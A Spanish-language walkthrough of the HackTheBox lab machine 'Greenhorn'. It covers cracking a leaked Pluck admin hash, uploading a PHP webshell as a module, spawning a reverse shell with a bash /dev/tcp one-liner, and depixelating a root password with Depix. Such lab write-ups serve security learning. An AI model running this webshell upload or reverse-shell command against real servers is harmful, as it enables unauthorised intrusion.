---
title: "Máquina Greenhorn"
description: "Resolución de la máquina Greenhorn de HackTheBox"
tags: ["Git leak", "pluck", "Pixelated images"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/greenhorn/logo.webp"
---

Nos podremos encontrar un simple pluck de una persona y su servidor Gitea, en el cual dicha persona guardó la contraseña de administrador hasheada... pero la contraseña es débil. Obtendremos acceso administrativo al pluck y posteriormente una consola interactiva. Después de tomar el control de un usuario veremos que posee una imagen con la contraseña de root pixelada, y la vamos a despixelar.

## Reconocimiento

La máquina tiene 3 puertos abiertos:

```bash
# Nmap 7.95 scan initiated Sat Jul 20 15:01:04 2024 as: nmap -sS -Pn -vvv -p- --open -oN ports --min-rate 300 -n 10.129.89.74
Nmap scan report for 10.129.89.74
Host is up, received user-set (0.24s latency).
Scanned at 2024-07-20 15:01:04 -04 for 210s
Not shown: 63449 closed tcp ports (reset), 2083 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jul 20 15:04:34 2024 -- 1 IP address (1 host up) scanned in 210.43 seconds
```

El puerto 80 nos manda a `greenhorn.htb`, vamos a agregarlo a nuestro archivo de hosts:

```bash
10.10.11.25 greenhorn.htb
```
{: file="/etc/hosts" }

Esta web principal tiene un Pluck sin mucho más, pero el puerto 3000 es un Gitea con un repositorio:

![Gitea](/assets/writeups/greenhorn/1.png)

Veamos que hay por acá.

## Intrusión

### www-data - greenhorn

Mirando los archivos que hay en el repositorio de arriba, podemos ver que se trata del Pluck que vimos antes y al mismo tiempo evidenciamos que alguien no es muy inteligente:

![Uh oh](/assets/writeups/greenhorn/2.png)

Este hash es la contraseña del panel administrativo, y es crackeable

```bash
❯ hashcat -m 1700 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  --show
d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
```

y con ella podemos acceder como administradores al Pluck

![Pluck admin](/assets/writeups/greenhorn/3.png)

Buscando por vulnerabilidades ahora, podemos encontrar que Pluck tiene una función para subir módulos, y esto es aprovechable para subir archivos php. Podemos simplemente subir un zip que contiene un archivo PHP malicioso en la parte de instalar módulos y:

```bash
❯ curl -v "http://greenhorn.htb/data/modules/uwu/uwu.php?uwu=id"
* Host greenhorn.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.25
*   Trying 10.10.11.25:80...
* Connected to greenhorn.htb () port 80
> GET /data/modules/uwu/uwu.php?uwu=id HTTP/1.1
> Host: greenhorn.htb
> User-Agent: curl/8.10.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 07 Dec 2024 00:55:56 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
* Connection #0 to host greenhorn.htb left intact
```

Ahora podemos simplemente enviarnos una consola interactiva utilizando nuestro oneliner favorito `bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.25 44124
bash: cannot set terminal process group (1116): Inappropriate ioctl for device
bash: no job control in this shell
www-data@greenhorn:~/html/pluck/data/modules/uwu$ script /dev/null -c bash # Iniciar un nuevo proceso
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@greenhorn:~/html/pluck/data/modules/uwu$ ^Z # CTRL + Z
[1]  + 28398 suspended  nc -lvnp 443

❯ stty raw -echo; fg # Pasar controles de la terminal al proceso
[1]  + 28398 continued  nc -lvnp 443
                                    reset xterm # Reiniciar terminal
www-data@greenhorn:~/html/pluck/data/modules/uwu$ export TERM=xterm-256color # Establecer tipo de terminal
www-data@greenhorn:~/html/pluck/data/modules/uwu$ stty rows 34 columns 149 # Establecer filas y columnas
www-data@greenhorn:~/html/pluck/data/modules/uwu$ source /etc/skel/.bashrc # ¡Colores!
```

### junior - greenhorn

La misma contraseña que encontramos en el principio sirve para este usuario

```bash
www-data@greenhorn:/$ su junior
Password: 
junior@greenhorn:/$
```

En su directorio personal encontraremos la primera flag.

```bash
junior@greenhorn:~$ ls -la
total 76
drwxr-xr-x 3 junior junior  4096 Dec  6 17:19 .
drwxr-xr-x 4 root   root    4096 Jun 20 06:36 ..
lrwxrwxrwx 1 junior junior     9 Jun 11 14:38 .bash_history -> /dev/null
drwx------ 2 junior junior  4096 Jun 20 06:36 .cache
-rw-r----- 1 root   junior 61367 Jun 11 14:39 openvas.pdf
-rw-r----- 1 root   junior    33 Dec  6 14:47 user.txt
junior@greenhorn:~$ cat user.txt
775c61eab25b33a3ee19f549a2******
```

## Escalada de privilegios

Como habrás visto arriba, hay un documento PDF que contiene lo siguiente:

![PDF](/assets/writeups/greenhorn/4.png)

Una contraseña pixelada que parece ser la root... aunque esto parezca seguro no lo es.

Haciendo uso de la matemática puede que llegemos a obtener el texto pixelado de la imagen, un buen ejemplo de implementación puede ser [esta herramienta](https://github.com/JonasSchatz/DepixHMM) que se basa en probabilidades y una máquina de estados finitos para "adivinar" los carácteres detrás del texto pixelado. Sin embargo esta misma no nos será de utilidad.

La que si nos sirve y encima, está diseñada especificamente para contraseñas es [esta](https://github.com/spipm/Depix), clonándola y viendo como usarlo podremos ver que necesitaremos una imagen de referencia del lugar donde fue escrita y pixelada la imagen. Enfocando bien el PDF podremos notar una secuencia de pixeles dentro de los datos pixelados:

![Orange](/assets/writeups/greenhorn/5.png)

El Notepad de Windows es el único editor que tiene la peculiaridad de bordear los carácteres con colores (a niveles casi que microscópicos); tomando una screenshot de un notepad y haciendo zoom podrás notarlo. Incluso la propia herramienta tiene un ejemplo en el README de esto... y los bloques de píxeles generados son demasiado similares.

Haciendo uso de la imagen `debruinseq_notepad_Windows10_close.png` para la secuencia [De Bruijn](https://en.wikipedia.org/wiki/De_Bruijn_sequence) que usará la herramienta y extrayendo la imagen pixelada del PDF, la susodicha nos dirá esto:

```bash
❯ python depix.py -p test.png -s images/searchimages/debruinseq_notepad_Windows10_close.png -o pixels2.png
2024-12-06 21:41:24,146 - Loading pixelated image from test.png
2024-12-06 21:41:24,177 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_close.png
2024-12-06 21:41:24,401 - Finding color rectangles from pixelated space
2024-12-06 21:41:24,406 - Found 1815 same color rectangles
2024-12-06 21:41:24,407 - 1373 rectangles left after moot filter
2024-12-06 21:41:24,407 - Found 10 different rectangle sizes
2024-12-06 21:41:24,407 - Finding matches in search image
2024-12-06 21:41:24,407 - Scanning 14 blocks with size (2, 2)
2024-12-06 21:41:24,409 - Scanning in searchImage: 0/1180
2024-12-06 21:41:24,635 - Scanning in searchImage: 118/1180
2024-12-06 21:41:24,858 - Scanning in searchImage: 236/1180
2024-12-06 21:41:25,086 - Scanning in searchImage: 354/1180
2024-12-06 21:41:25,316 - Scanning in searchImage: 472/1180
2024-12-06 21:41:25,547 - Scanning in searchImage: 590/1180
2024-12-06 21:41:25,778 - Scanning in searchImage: 708/1180
2024-12-06 21:41:26,005 - Scanning in searchImage: 826/1180
2024-12-06 21:41:26,236 - Scanning in searchImage: 944/1180
2024-12-06 21:41:26,466 - Scanning in searchImage: 1062/1180
... [snip]
2024-12-06 21:43:39,059 - Splitting single matches and multiple matches
2024-12-06 21:43:39,673 - [218 straight matches | 0 multiple matches]
2024-12-06 21:43:39,673 - Trying geometrical matches on single-match squares
2024-12-06 21:43:39,673 - [218 straight matches | 0 multiple matches]
2024-12-06 21:43:39,673 - Trying another pass on geometrical matches
2024-12-06 21:43:39,673 - [218 straight matches | 0 multiple matches]
2024-12-06 21:43:39,673 - Writing single match results to output
2024-12-06 21:43:39,675 - Writing average results for multiple matches to output
2024-12-06 21:43:39,676 - Saving output image to: pixels2.png
```

La imagen resultante `pixels2.png` tiene esto:

![Depixelated](/assets/writeups/greenhorn/6.png)

Se puede llegar a leer `sidefromsidetheothersidesidefromsidetheotherside`, y si intentamos usar este texto como contraseña de root:

```bash
junior@greenhorn:~$ su
Password: 
root@greenhorn:/home/junior#
```

Con esto ya podremos tomar la última flag.

```bash
root@greenhorn:/home/junior# cd ~
root@greenhorn:~# ls -la 
total 44
drwx------  5 root root 4096 Dec  6 14:47 .
drwxr-xr-x 20 root root 4096 Jun 20 07:06 ..
lrwxrwxrwx  1 root root    9 Jun 11 14:42 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Jun 20 06:36 .cache
-rwxr-xr-x  1 root root  250 Jun 19 17:06 cleanup.sh
drwxr-xr-x  3 root root 4096 Jun 20 06:36 .local
lrwxrwxrwx  1 root root    9 Jun 20 05:44 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rwxr-xr-x  1 root root  962 Jul 18 13:01 restart.sh
-rw-r-----  1 root root   33 Dec  6 14:47 root.txt
-rw-r--r--  1 root root   66 Jul 18 12:59 .selected_editor
drwx------  2 root root 4096 Jun 20 06:36 .ssh
root@greenhorn:~# cat root.txt
bf6777664160d9443db44b8ed2******
```

## Extra

Esta máquina, a pesar de tener una escalada divertida, es muuy CTF y nada realista. Ningún sysadmin, dev, ingenierio, devops y demás dejaría la contraseña del sistema pixelada dentro de un documento que será enviado a algún empleado o ayudante. La razón por la que le hice writeup es principalmente por la escalada jaja.